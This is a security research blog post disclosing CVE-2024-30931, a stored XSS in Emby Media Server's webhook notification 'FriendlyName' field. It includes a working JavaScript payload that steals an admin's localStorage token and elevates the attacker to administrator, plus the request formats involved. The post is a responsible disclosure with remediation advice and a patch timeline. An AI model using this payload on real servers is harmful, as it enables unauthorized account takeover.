<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="CVE-2024-30931 - Emby XSS" />
<meta property="og:locale" content="en" />
<meta name="description" content="Emby Media Server XSS" />
<meta property="og:description" content="Emby Media Server XSS" />
<link rel="canonical" href="https://happy-little-accidents.pages.dev/posts/CVE-2024-30931/" />
<meta property="og:url" content="https://happy-little-accidents.pages.dev/posts/CVE-2024-30931/" />
<meta property="og:site_name" content="Happy Little Accidents!" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-19T21:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2024-30931 - Emby XSS" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-06-19T21:00:00+00:00","datePublished":"2024-06-19T21:00:00+00:00","description":"Emby Media Server XSS","headline":"CVE-2024-30931 - Emby XSS","mainEntityOfPage":{"@type":"WebPage","@id":"https://happy-little-accidents.pages.dev/posts/CVE-2024-30931/"},"url":"https://happy-little-accidents.pages.dev/posts/CVE-2024-30931/"}</script>
<!-- End Jekyll SEO tag -->


  <title>CVE-2024-30931 - Emby XSS | Happy Little Accidents!
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Happy Little Accidents!">
<meta name="application-name" content="Happy Little Accidents!">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      let self = this;this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          self.clearMode();
        }
        self.notify();
      });

      if (!this.hasMode) {
        return;
      }

      if (this.isDarkMode) {
        this.setDark();
      } else {
        this.setLight();
      }
    }

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isPreferDark() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }get modeStatus() {
      if (this.hasMode) {
        return this.mode;
      } else {
        return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        this.clearMode();
      } else {
        if (this.isPreferDark) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    }
  }

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/HappyLittleAccidents.webp" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Happy Little Accidents!</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Research blog for the Accidents team</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
    

    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>CVE-2024-30931 - Emby XSS</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>CVE-2024-30931 - Emby XSS</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1718830800"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jun 19, 2024
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                Jack Moran (itz-d0dgy)
                </em>, <em>
              
                Ethan McKee-Harris (Skelmis)
                </em>, <em>
              
                Elf Eldridge (Kaiwhata)
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1145 words"
>
  <em>6 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <h1 id="emby-media-server-xss">Emby Media Server XSS</h1>

<p>TL;DR - Whilst playing with Emby Media Server 4.8.3.0, we found stored XSS and, due to other security configurations in the platform, we were able to craft a payload that results in privilege escalation to a platform admin.</p>

<h1 id="shoutout">Shoutout</h1>

<p>We want to start by giving a huge shoutout to the Emby team (particularly Luke!). They were receptive of the issue, really responsive, and great to discuss the implications with. PLUS they had a patch ready and pushed in an impressively short period of time. They have, without a doubt, made this one of the best disclosure processes we have been involved with. Awesome work - we wish more disclosure processes were like this!</p>

<h1 id="technical-details">Technical details</h1>
<h2 id="what-is-it"><span class="me-2">What is it?</span><a href="#what-is-it" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p><a href="https://emby.media/">Emby</a> is a media content management system, which allows storage and access of media from across a variety of devices. It’s a great alternative to things like Plex and Jellyfin. The usage model is that any user can setup an Emby Media Server on their device - and then they can invite other users to browse their content through a system of invites. Invites only grant users access to specific libraries and content, and shouldn’t be able to view or adjust the site settings (unless their account account is elevated to an administrator).</p>

<h2 id="what-was-wrong"><span class="me-2">What was wrong?</span><a href="#what-was-wrong" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>When interacting with the application we found that Emby allowed all users to create custom notifications for themselves via the form of webhooks. These notifications allowed a user to:</p>
<blockquote>
  <p>“Setup notifications to stay informed of important events on your Emby Server.”</p>
</blockquote>

<p>However, we found that there was insufficient validation on the custom notification creation request which makes it vulnerable to abuse. Stored within the <code class="language-plaintext highlighter-rouge">FriendlyName</code> parameter, we discovered that low-privileged users are able to include HTML and JavaScript. Y’all can probably see where this is going…</p>

<p>Creating notifications involves a single POST request with the following body (as an example):</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/emby/Notifications/Services/Configured?X-Emby-Client=Emby+Web&amp;X-Emby-Device-Name=Firefox+Windows&amp;X-Emby-Device-Id=5e9c8c56-57cc-4efb-918e-93043f9d8316&amp;X-Emby-Client-Version=4.8.3.0&amp;X-Emby-Token=33b5bd218d99420cbb2dca6d8fc724ec&amp;X-Emby-Language=en-gb&amp;reqformat=json</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="s">[SNIP]</span>

<span class="p">{</span><span class="w">
  </span><span class="nl">"NotifierKey"</span><span class="p">:</span><span class="s2">"webhooknotifications"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"SetupModuleUrl"</span><span class="p">:</span><span class="s2">"configurationpage?name=webhookeditorjs"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"ServiceName"</span><span class="p">:</span><span class="s2">"Webhooks"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"PluginId"</span><span class="p">:</span><span class="s2">"85a7b1d4-fbda-4e85-a0a2-ac303c9946a4"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"FriendlyName"</span><span class="p">:</span><span class="s2">"anything your heart desires"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"6fa55ef97af842138d96d4f207e4a702"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Enabled"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"UserIds"</span><span class="p">:[],</span><span class="w">
  </span><span class="nl">"DeviceIds"</span><span class="p">:[],</span><span class="w">
  </span><span class="nl">"LibraryIds"</span><span class="p">:[],</span><span class="w">
  </span><span class="nl">"EventIds"</span><span class="p">:[</span><span class="s2">"system.serverrestartrequired"</span><span class="p">,</span><span class="s2">"system.updateavailable"</span><span class="p">],</span><span class="w">
  </span><span class="nl">"UserId"</span><span class="p">:</span><span class="s2">"2"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"IsSelfNotification"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Options"</span><span class="p">:{</span><span class="nl">"EnableMultipartFormData"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"Url"</span><span class="p">:</span><span class="s2">"https://example.com"</span><span class="p">},</span><span class="w">
  </span><span class="nl">"Type"</span><span class="p">:</span><span class="s2">"UserNotification"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"ServerId"</span><span class="p">:</span><span class="s2">"6f6e060683af45eca5431bd2c3e024c2"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"EventNames"</span><span class="p">:</span><span class="s2">"Server"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>A simple <code class="language-plaintext highlighter-rouge">&lt;img src=1 onerror='alert("2")'&gt;</code> here, a submission of the request there, and boom we have some Stored XSS whenever that notification is viewed.</p>

<p>Note that the <code class="language-plaintext highlighter-rouge">ServerId</code> and <code class="language-plaintext highlighter-rouge">UserId</code>, are already disclosed by the URI when logging in (but the <code class="language-plaintext highlighter-rouge">UserId</code> in the POST request above is different to the <code class="language-plaintext highlighter-rouge">UserId</code> disclosed in the URI. It is the URI’s <code class="language-plaintext highlighter-rouge">UserId</code> which is unique and used in all following requests.)</p>

<h2 id="so-what"><span class="me-2">So what?</span><a href="#so-what" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>At the moment though, exploiting this vulnerability is pretty pointless - sure you could inject some JavaScript or HTML and make the page look a bit funky - but not much else. Unless the site is doing something weird, it is unlikely that we would be able to do much damage here.</p>

<p>But, speaking of weird, we wondered how Emby handles authentication and authorization.</p>

<p>After a little digging, we discovered that authenticated users requests all contain the <code class="language-plaintext highlighter-rouge">X-Emby-Token</code> (a little weird that it’s sent as part of the URI and not the body of the POST request but ¯\<em>(ツ)</em>/¯). So where is that token stored? A cookie with the HTTP Only attribute? No, in Local Storage!</p>

<p><a href="/commons/lionel.webp" class="popup img-link  shimmer"><img src="/commons/lionel.webp" alt="Oh no, this is all wrong" loading="lazy"></a></p>

<p>As the token is stored in local storage as part of the <code class="language-plaintext highlighter-rouge">servercredentials3</code> item, it means that we are able to access the value of that token using client-side JavaScript. Which looks something like this:</p>

<p><code class="language-plaintext highlighter-rouge">token = JSON.parse(localStorage.getItem("servercredentials3")).Servers[0].Users[0].AccessToken;</code></p>

<p>But still, retrieving our own token isn’t much to get excited about - after all we already have it! But if we were able to retrieve someone else’s token, we might be able to perform actions as that user!</p>

<h2 id="the-last-piece"><span class="me-2">The last piece</span><a href="#the-last-piece" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>So after a bit of poking and prodding of administrative functionality, we discovered that administrators have this wonderful thing called administrator functionality (/s)! As part of the administrative functionality, admins can elevate the privileges of any other user on the platform by making a POST request to <code class="language-plaintext highlighter-rouge">/emby/Users/&lt;UserId&gt;/Policy</code>, with the payload <code class="language-plaintext highlighter-rouge">{"IsAdministrator":true}</code>.</p>

<p>Elevating the user above (as an example) would be a single POST request with the following body:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/emby/Users/6ff8d0b689e54f09a5f5819b8d73a5b0/Policy?X-Emby-Token=&lt;admin_token_from_local_storage&gt;</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="s">[SNIP]</span>

<span class="p">{</span><span class="w">
    </span><span class="nl">"IsAdministrator"</span><span class="p">:</span><span class="kc">true</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="putting-it-all-together"><span class="me-2">Putting it all together</span><a href="#putting-it-all-together" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Putting all the pieces together, all we really need to do is to replace our original Stored XSS payload with the following payload, which defines and executes a custom JavaScript function to retrieve the token and then submit a POST request using it (but replacing the <code class="language-plaintext highlighter-rouge">UserId</code> in <code class="language-plaintext highlighter-rouge">/emby/Users/&lt;UserId&gt;/Policy</code> with the <code class="language-plaintext highlighter-rouge">UserId</code> of the current user):</p>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">1</span> <span class="na">onerror=</span><span class="s">'(
    function foo(){ 
        token = JSON.parse(localStorage.getItem("servercredentials3")).Servers[0].Users[0].AccessToken; 
        var xhttp = new XMLHttpRequest(); 
        xhttp.open("POST", "/emby/Users/&lt;UserId&gt;/Policy?X-Emby-Token="+token, true); 
        xhttp.setRequestHeader("Content-type", "application/json"); 
        xhttp.send(JSON.stringify({"IsAdministrator":true})); 
        alert("Oh, I am the captain now?"); 
    }
).call(this)'</span><span class="nt">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Saving the notification will trigger a pop-up when the XSS triggers, but it currently does nothing as our user doesn’t have permissions to elevate users to admins. However, this Stored XSS triggers when ANY user views your notifications, now we could wait for the off chance someone looks at the notification…. or we could send it to someone. Say, the server admin? So we send the admin the notification! The URL for the notifications page looks something like (using the user and server ids obtained above):</p>

<p><code class="language-plaintext highlighter-rouge">https://emby.redacted/web/index.html#!/settings/notifications.html?userId=6ff8d0b689e54f09a5f5819b8d73a5b0&amp;serverId=6f6e060683af45eca5431bd2c3e024c2</code></p>

<p>All we need to do now is to get any Emby user with admin permissions to the site, to visit the link above to our notification page, and our payload will retrieve their token and use it to make our user an admin of the site!</p>

<h2 id="good-practice"><span class="me-2">Good practice</span><a href="#good-practice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>There are several issues here which allowed this exploitation chain. Preventing any one of them would have made this exploit significantly harder if not impossible.</p>
<ol>
  <li>Input validation, and not trusted user-provided input in any POST or GET request would have prevented the Stored XSS in the first place. An excellent library for performing that in JavaScript is <a href="https://github.com/cure53/DOMPurify">DOMPurify</a></li>
  <li>The presence of a content security policy (CSP) may have prevented any Stored XSS payload from triggering</li>
  <li>Storing credentials as Cookies (rather than in local storage), would have prevented the Stored XSS from being able to access the token (if the Cookies were configured correctly with <em>cough</em> <code class="language-plaintext highlighter-rouge">HttpOnly</code> <em>cough</em>). Good practice guide <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">here</a></li>
  <li>Re-authentication for privilaged functionality is also something that could be considered.</li>
</ol>

<h2 id="disclosure-timeline"><span class="me-2">Disclosure timeline</span><a href="#disclosure-timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li>17/03/2024: Disclosure submitted to Emby.</li>
  <li>21/03/2024: Confirmed receipt by Emby and statement that the issue will be patched in 4.8.4.</li>
  <li>22/03/2024: Applied for MITRE CVE (with permission from the Emby team).</li>
  <li>04/04/2024: CVE-2024-30931 reserved.</li>
  <li>10/04/2024: Next release date of patched version of Emby announced.</li>
  <li>21/04/2024: Fixed version of Emby released (4.8.4.0).</li>
  <li>21/06/2024: Blog post published. Yeah I’m a slow writer okay?</li>
</ul>

<h2 id="reporters"><span class="me-2">Reporters</span><a href="#reporters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li><a href="https://github.com/itz-d0dgy">itz-d0dgy</a></li>
  <li><a href="https://github.com/kaiwhata">kaiwhata</a></li>
  <li><a href="https://github.com/skelmis">skelmis</a></li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/cve/">CVE</a>,
          <a href="/categories/xss/">XSS</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/DEADLOCK/">Deadlock SSRF to IP disclosure</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-36814/">CVE-2024-36814 - Adguard Home Arbitrary File Read</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-43801/">CVE-2024-43801 - Jellyfin XSS</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-41808/">CVE-2024-41808 - Unauthenticated log injection to account takeover</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-30931/">CVE-2024-30931 - Emby XSS</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->


















            </div>

            
              
              



  <section id="toc-wrapper" class="d-none ps-0 pe-4">
    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/CVE-2024-43801/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1725224400"
  data-df="ll"
  
>
  Sep  1, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-43801 - Jellyfin XSS</h4>
              <div class="text-muted">
                <p>Jellyfin XSS

TL;DR - Jellyfin deployments using versions 10.9.9 or lower are vulnerable to stored XSS which allowed privilege escalation to a platform administrator and ultimately to arbitrary cod...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CVE-2024-36814/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1728248400"
  data-df="ll"
  
>
  Oct  6, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-36814 - Adguard Home Arbitrary File Read</h4>
              <div class="text-muted">
                <p>Adguard Home Arbitrary File Read
TL;DR - Adguard Home deployments using versions 0.107.52 or lower are vulnerable to Arbitrary File Read which allowed a local authenticated user to target privilege...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CVE-2024-41808/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1722805200"
  data-df="ll"
  
>
  Aug  4, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-41808 - Unauthenticated log injection to account takeover</h4>
              <div class="text-muted">
                <p>OpenObserve vulnerability chain

TL;DR - OpenObserve deployments using version 0.9.1 or lower are vulnerable to the following privilege escalation chain:

  A malicious user submits logs via a serv...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Older">
      <p>-</p>
    </div>
  

  
    <a
      href="/posts/CVE-2024-41808/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>CVE-2024-41808 - Unauthenticated log injection to account takeover</p>
    </a>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://github.com/happy-little-accidents">happy-little-accidents</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.0.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
